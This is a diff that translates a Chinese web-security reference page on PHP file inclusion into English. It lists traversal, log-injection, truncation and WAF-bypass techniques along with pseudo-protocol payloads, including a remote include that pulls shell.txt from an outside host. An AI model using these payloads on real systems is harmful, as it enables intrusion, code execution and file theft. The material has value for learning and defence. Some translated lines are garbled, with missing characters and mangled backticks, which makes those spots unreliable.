@@ -1,75 +1,75 @@
-文件包含
+File contains
 ========================================
 
-基础
+Base
 ----------------------------------------
-常见的文件包含漏洞的形式为 ``<?php include("inc/" . $_GET['file']); ?>``
+Common file contains vulnerabilities in the form of ``<?php include("inc/" . $_GET['file']); ?>``
 
-考虑常用的几种包含方式为
+Consider several commonly used methods of inclusion
 
-- 同目录包含 ``file=.htaccess``
-- 目录遍历 ``?file=../../../../../../../../../var/lib/locate.db``
-- 日志注入 ``?file=../../../../../../../../../var/log/apache/error.log``
-- 利用 ``/proc/self/environ``
+- The same directory contains ``file=.htaccess``
+- Directory traversal ``?file=../../../../../../../../var/lib/locate.db``
+- Log injection ``?file=../../../../../../../../var/log/apache/error.log``
+-Use ``/proc/self/environ``
 
-其中日志可以使用SSH日志或者Web日志等多种日志来源测试
+The log can be tested using SSH logs or web logs.
 
-触发Sink
+Trigger Sink
 ----------------------------------------
 - PHP
-    - include
-        - 在包含过程中出错会报错，不影响执行后续语句
-    - include_once
-        - 仅包含一次
-    - require
-        - 在包含过程中出错，就会直接退出，不执行后续语句
-    - require_once
+- include
+- An error occurs during the inclusion process and will not affect the execution of subsequent statements
+- include_once
+- Only once included
+- require
+- If an error occurs during the inclusion process, it will exit directly and no subsequent statements will be executed
+- require_once
 
 
-绕过技巧
+Bypassing Tips
 ----------------------------------------
-常见的应用在文件包含之前，可能会调用函数对其进行判断，一般有如下几种绕过方式
+Common applications may call functions to judge the file before it is included. Generally, there are several ways to bypass it.
 
-url编码绕过
+Url encoding bypass
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-如果WAF中是字符串匹配，可以使用url多次编码的方式可以绕过
+If the string matches in WAF, you can use url multiple encodings to bypass it
 
-特殊字符绕过
+Special character bypass
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-- 某些情况下，读文件支持使用Shell通配符，如 ``?`` ``*`` 等
-- url中 使用 ``?`` ``#`` 可能会影响include包含的结果
-- 某些情况下，unicode编码不同但是字形相近的字符有同一个效果
+- In some cases, reading files supports the use of Shell wildcards, such as ``?`````*`, etc.
+- Using ``?``````` in url may affect the results included
+- In some cases, characters with different encodings but similar glyphs have the same effect
 
-%00截断
+%00 cutoff
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-几乎是最常用的方法，条件是 ``magic_quotes_gpc`` 关闭，而且php版本小于5.3.4。
+Almost the most commonly used method, provided that ``magic_quotes_gpc`` is closed and the php version is less than 5.3.4.
 
-长度截断
+Length cutoff
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-Windows上的文件名长度和文件路径有关。具体关系为：从根目录计算，文件路径长度最长为259个bytes。
+The length of the file name on Windows is related to the file path. The specific relationship is: from the root directory, the file path length is up to 259 bytes.
 
-msdn定义 ``#define MAX_PATH 260``，其中第260个字符为字符串结尾的 ``\0`` ，而linux可以用getconf来判断文件名长度限制和文件路径长度限制。
+msdn definition ``#define MAX_PATH 260``, where the 260th character is the end of the string `` `` , while Linux can use getconf to determine file name length limit and file path length limit.
 
-获取最长文件路径长度：getconf PATH_MAX /root 得到4096
-获取最长文件名：getconf NAME_MAX /root 得到255
+Get the longest file path length: getconf PATH_MAX /root Get 4096
+Get the longest file name: getconf NAME_MAX /root Get 255
 
-那么在长度有限的时候，``././././`` (n个) 的形式就可以通过这个把路径爆掉
+Then when the length is limited, the path can be exploded through this form of ``././././`.
 
-在php代码包含中，这种绕过方式要求php版本 < php 5.2.8
+In the php code inclusion, this bypass method requires the php version < php 5.2.8
 
-伪协议绕过
+Pseudo-Protocol Bypass
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-- 远程包含: 要求 ``allow_url_fopen=On`` 且 ``allow_url_include=On`` ， payload为 ``?file=[http|https|ftp]://websec.wordpress.com/shell.txt`` 的形式
-- PHP input: 把payload放在POST参数中作为包含的文件，要求 ``allow_url_include=On`` ，payload为 ``?file=php://input`` 的形式
-- Base64: 使用Base64伪协议读取文件，payload为 ``?file=php://filter/convert.base64-encode/resource=index.php`` 的形式
-- data: 使用data伪协议读取文件，payload为 ``?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=`` 的形式，要求 ``allow_url_include=On``
+- Remote contains: Requires ``allow_url_fopen=On`` and ``allow_url_include=On``, and payload is ``?file=[http|https|ftp]://websec.wordpress.com/shell.txt`` form
+- PHP input: Put the payload in the POST parameter as the included file, requiring ``allow_url_include=On``, and the payload is in the form of ``?file=php://input``
+- Base64: Use Base64 pseudo-protocol to read files, payload is in the form of ``?file=php://filter/convert.base64-encode/resource=index.php``
+- data: Use the data pseudo-protocol to read the file, payload is in the form of ``?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=``, requiring ``allow_url_include=On``
 
-协议绕过
+Protocol bypass
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-``allow_url_fopen`` 和 ``allow_url_include`` 主要是针对 ``http`` ``ftp`` 两种协议起作用，因此可以使用SMB、WebDav协议等方式来绕过限制。
+``allow_url_fopen`` and ``allow_url_include`` mainly work for the ``http`` ``ftp`` two protocols, so SMB, WebDav protocols, etc. can be used to bypass restrictions.
 
-参考链接
+Reference link
 ----------------------------------------
 - `Exploit with PHP Protocols <https://www.cdxy.me/?p=752>`_
 - `lfi cheat sheet <https://highon.coffee/blog/lfi-cheat-sheet/>`_
